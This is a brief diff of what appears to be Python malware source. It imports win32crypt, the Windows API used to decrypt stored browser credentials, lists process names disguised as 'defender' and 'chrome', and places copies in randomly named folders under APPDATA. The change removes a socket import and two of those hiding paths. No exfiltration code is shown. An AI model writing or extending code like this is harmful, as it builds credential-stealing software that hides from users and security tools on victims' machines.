@@ -8,7 +8,6 @@ import codecs
 import win32crypt
 import shutil
 import command
-import socket
 import time
 import random
 import threading
@@ -69,8 +68,6 @@ PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appd
 PROCESS_PATHS = [
 	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
 	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
-	"C:\\" + str(uuid.uuid4()),
-	str(Path.home()) + "\\" + str(uuid.uuid4())
 ]
 PROCESS_NUM = processnumbers
 
